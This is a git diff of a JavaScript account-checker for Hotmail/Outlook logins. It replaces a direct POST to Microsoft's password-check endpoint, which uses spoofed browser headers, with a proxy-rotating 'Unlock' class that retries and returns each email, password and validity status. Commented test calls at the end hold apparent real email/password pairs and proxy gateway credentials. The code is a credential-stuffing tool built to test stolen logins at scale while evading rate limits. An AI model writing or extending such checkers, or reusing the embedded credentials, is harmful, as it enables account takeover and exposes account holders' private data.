@@ -1,62 +1,4 @@
-const axios = require('axios-https-proxy-fix');
-
-const instance = axios.create({
-  timeout: 20000,
-})
-
-const checkLoginHotmail = async (email, password, proxyString) => {
-  let data = JSON.stringify({
-    "username": email,
-    "password": password,
-    "checkpasswordflowtoken": "",
-  });
-  const proxyArr = proxyString.split(":");
-  const proxy = {
-    protocol: 'http',
-    host: proxyArr[0],
-    port: parseInt(proxyArr[1]),
-    ...(proxyArr[2] && {
-      auth: { username: proxyArr[2], password: proxyArr[3] }
-    })
-  }
-  return new Promise((resolve) => {
-    var options = {
-      method: 'POST',
-      url: 'https://login.live.com/checkpassword.srf',
-      headers: {
-        'Accept': 'application/json',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json; charset=utf-8',
-        'Origin': 'https://login.live.com',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
-        'hpgact': '0',
-        'hpgid': '33',
-        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"macOS"',
-        'sec-ch-ua-platform-version': '"14.7.4"'
-      },
-      data: data,
-      // proxy: proxy
-    };
-    instance.request(options)
-      .then(function (response) {
-        console.log(response.data);
-        if (response?.data?.validationresult === "succeed") {
-          resolve('valid');
-        } else {
-          resolve('invalid');
-        }
-      }).catch((e) => {
-        console.log(e);
-        resolve('unchecked');
-      });
-  });
-}
+const HotmailClass = require('./hotmail');
 
 async function checkLoginHotmailWithRetry(email, password, listProxy) {
   let retry = 0;
@@ -68,24 +10,39 @@ async function checkLoginHotmailWithRetry(email, password, listProxy) {
     proxies = [null];
   }
 
-  while (retry < 5) {
+  while (retry < 3) {
     try {
       const proxyString = proxies[retry % proxies.length];
-      const result = await checkLoginHotmail(email, password, proxyString);
-      if (result === 'valid' || result === 'invalid') {
-        return { status: result, email };
+      let proxy = proxyString;
+      if (proxyString) {
+        if (!proxyString.includes("http://")) {
+          proxy = `http://${proxyString}`;
+        }
+        if (proxyString.split(":").length === 4) {
+          const [host, port, username, password] =proxyString.split(':');
+          proxy = `http://${username}:${password}@${host}:${port}`;
+        }
+      }
+      const hotmail = new HotmailClass(proxy, email, password);
+      const { status } = await hotmail.Unlock();
+      if (status === 'success' || status === 'failed') {
+        let statusValue = status === 'success' ? 'valid' : 'invalid';
+        return { status: statusValue, email, password };
+      } else {
+        await new Promise(resolve => setTimeout(resolve, 2000));
       }
     } catch (error) {
+      await new Promise(resolve => setTimeout(resolve, 2000));
       // Try the next proxy, same style as action.js.
     }
     retry++;
   }
-
-  return { status: 'unchecked', email };
+  return { status: 'unchecked', email, password };
 }
 
 // (async () => {
-//   await checkLoginHotmail("commentaop@hotmail.com", "Lumiong47@", "127.0.0.1:9090");
+//   let a = await checkLoginHotmailWithRetry("tomatillo_86@hotmail.com", "VanBao55678@", ["gw.dataimpulse.com:823:0f601731bbfc77f2faea:84c168ea16712453"]);
+//   console.log(a);
 // })();
 
 module.exports = {
